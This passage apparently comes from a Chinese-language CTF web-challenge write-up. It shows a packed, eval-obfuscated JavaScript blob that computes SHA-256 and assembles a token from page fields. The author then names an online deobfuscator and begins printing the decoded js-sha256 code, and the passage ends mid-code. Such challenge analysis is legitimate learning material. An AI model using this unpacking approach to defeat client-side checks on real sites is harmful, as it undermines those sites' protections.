27)}z{p(s===2q||s===2T){1u\x20O\x201t(1l)}z\x20p(s.1J===Z){s=O\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\x201S.2x(2n).S(O\x201Y(s)).1G(\x271e\x27)}z{A\x20P(s)}};A\x202z};q\x202k=w(1X,x){A\x20w(G,s){A\x20O\x201P(G,x,1d).S(s)[1X]()}};q\x202f=w(x){q\x20P=2k(\x271e\x27,x);P.1T=w(G){A\x20O\x201P(G,x)};P.S=w(G,s){A\x20P.1T(G).S(s)};1g(q\x20i=0;i&lt;1E.W;++i){q\x20T=1E[i];P[T]=2k(T,x)}A\x20P};w\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\x202h,T=1c\x20s;p(T!==\x272p\x27){p(T===\x271n\x27){p(s===2q){1u\x20O\x201t(1l)}z\x20p(1y&amp;&amp;s.1J===Z){s=O\x202r(s)}z\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}2h=1d}q\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\x201w=O\x20Z(k.x?28:32);q\x201i=O\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\x201w};w\x201P(G,x,1v){q\x20i,T=1c\x20G;p(T===\x272p\x27){q\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\x271n\x27){p(G===2q){1u\x20O\x201t(1l)}z\x20p(1y&amp;&amp;G.1J===Z){G=O\x202r(G)}z\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}}p(G.W&gt;1k){G=(O\x20N(x,1d)).S(G).27()}q\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\x20X})}}})();w\x202y(e){1g(q\x20t=\x22\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\x20t}w\x202J(t,y=\x224B\x22){1m.1o(\x221M\x22).1r=1q(1m.1o(\x221M\x22).1r+y)}w\x202B(e=\x224E\x22){1m.1o(\x221M\x22).1r=1q(e+1m.1o(\x221M\x22).1r)}w\x202K(a,b){1m.1o(\x221M\x22).1r=2y(1m.1o(\x222F\x22).1r)}1m.1o(\x222F\x22).1r=\x22\x22;4u(w(){2B(\x224M\x22)},4N);1m.1o(\x224P\x22).4Q(\x224R\x22,2J);2K(\x223O\x22,44);'</span>,<span class="string">'||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW'</span>,<span class="string">'split'</span>];(<span class="keyword">function</span>(<span class="params">c,d</span>){<span class="keyword">var</span> e=<span class="keyword">function</span>(<span class="params">f</span>){<span class="keyword">while</span>(--f){c[<span class="string">'push'</span>](c[<span class="string">'shift'</span>]());}};<span class="title function_">e</span>(++d);}(a,<span class="number">0x1f4</span>));<span class="keyword">var</span> b=<span class="keyword">function</span>(<span class="params">c,d</span>){c=c-<span class="number">0x0</span>;<span class="keyword">var</span> e=a[c];<span class="keyword">return</span> e;};<span class="built_in">eval</span>(<span class="keyword">function</span>(<span class="params">d,e,f,g,h,i</span>){h=<span class="keyword">function</span>(<span class="params">j</span>){<span class="keyword">return</span>(j&lt;e?<span class="string">''</span>:<span class="title function_">h</span>(<span class="built_in">parseInt</span>(j/e)))+((j=j%e)&gt;<span class="number">0x23</span>?<span class="title class_">String</span>[<span class="title function_">b</span>(<span class="string">'0x0'</span>)](j+<span class="number">0x1d</span>):j[<span class="title function_">b</span>(<span class="string">'0x1'</span>)](<span class="number">0x24</span>));};<span class="keyword">if</span>(!<span class="string">''</span>[<span class="title function_">b</span>(<span class="string">'0x2'</span>)](<span class="regexp">/^/</span>,<span class="title class_">String</span>)){<span class="keyword">while</span>(f--){i[<span class="title function_">h</span>(f)]=g[f]||<span class="title function_">h</span>(f);}g=[<span class="keyword">function</span>(<span class="params">k</span>){<span class="keyword">if</span>(<span class="string">'wpA'</span>!==<span class="title function_">b</span>(<span class="string">'0x3'</span>)){<span class="keyword">return</span> i[k];}<span class="keyword">else</span>{<span class="keyword">while</span>(f--){i[<span class="title function_">k</span>(f)]=g[f]||<span class="title function_">k</span>(f);}g=[<span class="keyword">function</span>(<span class="params">l</span>){<span class="keyword">return</span> i[l];}];k=<span class="keyword">function</span>(<span class="params"></span>){<span class="keyword">return</span> <span class="title function_">b</span>(<span class="string">'0x4'</span>);};f=<span class="number">0x1</span>;}}];h=<span class="keyword">function</span>(<span class="params"></span>){<span class="keyword">return</span> <span class="title function_">b</span>(<span class="string">'0x4'</span>);};f=<span class="number">0x1</span>;};<span class="keyword">while</span>(f--){<span class="keyword">if</span>(g[f]){<span class="keyword">if</span>(<span class="title function_">b</span>(<span class="string">'0x5'</span>)===<span class="title function_">b</span>(<span class="string">'0x6'</span>)){<span class="keyword">return</span> i[h];}<span class="keyword">else</span>{d=d[<span class="title function_">b</span>(<span class="string">'0x2'</span>)](<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">'\x5cb'</span>+<span class="title function_">h</span>(f)+<span class="string">'\x5cb'</span>,<span class="string">'g'</span>),g[f]);}}}<span class="keyword">return</span> d;}(<span class="title function_">b</span>(<span class="string">'0x7'</span>),<span class="number">0x3e</span>,<span class="number">0x137</span>,<span class="title function_">b</span>(<span class="string">'0x8'</span>)[<span class="title function_">b</span>(<span class="string">'0x9'</span>)](<span class="string">'|'</span>),<span class="number">0x0</span>,{}));</span><br></pre></td></tr></table></figure>

<p>分析JavaScript代码，已经做了混淆；</p>
<p>使用在线解码工具<a href="http://deobfuscatejavascript.com/#%E8%A7%A3%E7%A0%81%E5%A6%82%E4%B8%8B%EF%BC%9B">http://deobfuscatejavascript.com/#解码如下；</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="string">'use strict'</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">ERROR</span> = <span class="string">'input is invalid type'</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">WINDOW</span> = <span class="keyword">typeof</span> <span class="variable language_">window</span> === <span class="string">'object'</span>;</span><br><span class="line">    <span class="keyword">var</span> root = <span class="variable constant_">WINDOW</span> ? <span class="variable language_">window</span> : {};</span><br><span class="line">    <span class="keyword">if</span> (root.<span class="property">JS_SHA256_NO_WINDOW</span>) {</span><br><span class="line">        <span class="variable constant_">WINDOW</span> = <span class="literal">false</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">WEB_WORKER</span> = !<span class="variable constant_">WINDOW</span> &amp;&amp; <span class="keyword">typeof</span> self === <span class="string">'object'</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">NODE_JS</span> = !root.<span class="property">JS_SHA256_NO_NODE_JS</span> &amp;&amp; <span class="keyword">typeof</span> process === <span class="string">'object'</span> &amp;&amp; process.<span class="property">versions</span> &amp;&amp; process.<span class="property">versions</span>.<span class="property">node</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable constant_">NODE_JS</span>) {</span><br><span class="line">        root = <span class="variable language_">global</span></span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable constant_">WEB_WORKER</span>) {</span><br><span class="line">        root = self</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">COMMON_JS</span> = !root.<span class="property">JS_SHA256_NO_COMMON_JS</span> &amp;&amp; <span class="keyword">typeof</span> <span class="variable language_">module</span> === <span class="string">'object'</span> &amp;&amp; <span class="variable language_">module</span>.<span class="property">exports</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">AMD</span> = <span class="keyword">typeof</span> define === <span class="string">'function'</span> &amp;&amp; define.<span class="property">amd</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">ARRAY_BUFFER</span> = !root.<span class="property">JS_SHA256_NO_ARRAY_BUFFER</span> &amp;&amp; <span class="keyword">typeof</span> <span class="title class_">ArrayBuffer</span> !== <span class="string">'undefined'</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">HEX_CHARS</span> = <span class="string">'0123456789abcdef'</span>.<span class="title function_">split</span>(<span class="string">''</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">EXTRA</span> = [-<span class="number">2147483648</span>, <span class="number">8388608</span>, <span class="number">32768</span>, <span class="number">128</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">SHIFT</span> = [<span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> K = [<span class="number">0x428a2f98</span>, <span class="number">0x71374491</span>, <span class="number">0xb5c0fbcf</span>, <span class="number">0xe9b5dba5</span>, <span class="number">0x3956c25b</span>, <span class="number">0x59f111f1</span>, <span class="number">0x923f82a4</span>, <span class="number">0xab1c5ed5</span>, <span class="number">0xd807aa98</span>, <span class="number">0x12835b01</span>, <span class="number">0x243185be</span>, <span class="number">0x550c7dc3</span>, <span class="number">0x72be5d74</span>, <span class="number">0x80deb1fe</span>, <span class="number">0x9bdc06a7</span>, <span class="number">0xc19bf174</span>, <span class="number">0xe49b69c1</span>, <span class="number">0xefbe4786</span>, <span class="number">0x0fc19dc6</span>, <span class="number">0x240ca1cc</span>, <span class="number">0x2de92c6f</span>, <span class="number">0x4a7484aa</span>, <span class="number">0x5cb0a9dc</span>, <span class="number">0x76f988da</span>, <span class="number">0x983e5152</span>, <span class="number">0xa831c66d</span>, <span class="number">0xb00327c8</span>, <span class="number">0xbf597fc7</span>, <span class="number">0xc6e00bf3</span>, <span class="number">0xd5a79147</span>, <span class="number">0x06ca6351</span>, <span class="number">0x14292967</span>, <span class="number">0x27b70a85</span>, <span class="number">0x2e1b2138</span>, <span class="number">0x4d2c6dfc</span>, <span class="number">0x53380d13</span>, <span class="number">0x650a7354</span>, <span class="number">0x766a0abb</span>, <span class="number">0x81c2c92e</span>, <span class="number">0x92722c85</span>, <span class="number">0xa2bfe8a1</span>, <span class="number">0xa81a664b</span>, <span class="number">0xc24b8b70</span>, <span class="number">0xc76c51a3</span>, <span class="number">0xd192e819</span>, <span class="number">0xd6990624</span>, <span class="number">0xf40e3585</span>, <span class="number">0x106aa070</span>, <span class="number">0x19a4c116</span>, <span class="number">0x1e376c08</span>, <span class="number">0x2748774c</span>, <span class="number">0x34b0bcb5</span>, <span class="number">0x391c0cb3</span>, <span class="number">0x4ed8aa4a</span>, <span class="number">0x5b9cca4f</span>, <span class="number">0x682e6ff3</span>, <span class="number">0x748f82ee</span>, <span class="number">0x78a5636f</span>, <span class="number">0x84c87814</span>, <span class="number">0x8cc70208</span>, <span class="number">0x90befffa</span>, <span class="number">0xa4506ceb</span>, <span class="number">0xbef9a3f7</span>, <span class="number">0xc67178f2</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">OUTPUT_TYPES</span> = [<span class="string">'hex'</span>, <span class="string">'array'</span>, <span class="string">'digest'</span>, <span class="string">'arrayBuffer'</span>];</span><br><span class="line">    <span class="keyword">var</span> blocks = [];</span><br><span class="line">    <span class="keyword">if</span> (root.<span class="property">JS_SHA256_NO_NODE_JS</span> || !<span class="title class_">Array</span>.<span class="property">isArray</span>) {</span><br><span class="line">        <span class="title class_">Array</span>.<span class="property">isArray</span> = <span class="keyword">function</span>(<span class="params">obj</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(obj) === <span class="string">'[object Array]'</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable constant_">ARRAY_BUFFER</span> &amp;&amp; (root.<span class="property">JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW</span> || !<span class="title class_">ArrayBuffer</span>.<span class="property">isView</span>)) {</span><br><span class="line">        <span class="title class_">ArrayBuffer</span>.<span class="property">isView</span> = <span class="keyword">function</span>(<span class="params">obj</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">typeof</span> obj === <span class="string">'object'</span> &amp;&amp; obj.<span class="property">buffer</span> &amp;&amp; obj.<span class="property">buffer</span>.<span class="property">constructor</span> === <span class="title class_">ArrayBuffer</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">var</span> createOutputMethod = <span class="keyword">function</span>(<span class="params">outputType, is224</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">message</span>) {</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Sha256</span>(is224, <span class="literal">true</span>).<span class="title function_">update</span>(message)[outputType]()</span><br><span class="line">            }</span><br><span class="line">        };</span><br><span class="line">    <span class="keyword">var</span> createMethod = <span class="keyword">function</span>(<span class="params">is224</span>) {</span><br><span class="line">            <span class="keyword">var</span> method = <span class="title function_">createOutputMethod</span>(<span class="string">'hex'</span>, is224);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable constant_">NODE_JS</span>) {</span><br><span class="line">                method = <span class="title function_">nodeWrap</span>(method, is224)</span><br><span class="line">            }</span><br><span class="line">            method.<span class="property">create</span> = <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Sha256</span>(is224)</span><br><span class="line">            };</span><br><span class="line">            method.<span class="property">update</span> = <span class="keyword">function</span>(<span class="params">message</span>) {</span><br><span class="line">                <span class="keyword">return</span> method.<span class="title function_">create</span>().<span class="title function_">update</span>(message)</span><br><span class="line">            };</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable constant_">OUTPUT_TYPES</span>.<span class="property">length</span>; ++i) {</span><br><span class="line">                <span class="keyword">var</span> type = <span class="variable constant_">OUTPUT_TYPES</span>[i];</span><br><span class="line">                method[type] = <span class="title function_">createOutputMethod</span>(type, is224)</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> method</span><br><span class="line">        };</span><br><span class="line">    <span class="keyword">var</span> nodeWrap = <span class="keyword">function</span>(<span class="params">method, is224</span>) {</span><br><span class="line">            <span class="keyword">var</span> crypto = <span class="built_in">eval</span>(<span class="string">"require('crypto')"</span>);</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Buffer</span> = <span class="built_in">eval</span>(<span class="string">"require('buffer').Buffer"</span>);</span><br><span class="line">            <span class="keyword">var</span> algorithm = is224 ? <span class="string">'sha224'</span> : <span class="string">'sha256'</span>;</span><br><span class="line">            <span class="keyword">var</span> nodeMethod = <span class="keyword">function</span>(<span class="params">message</span>) {</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">typeof</span> message === <span class="string">'string'</span>) {</span><br><span class="line">                        <span class="keyword">return</span> crypto.<span class="title 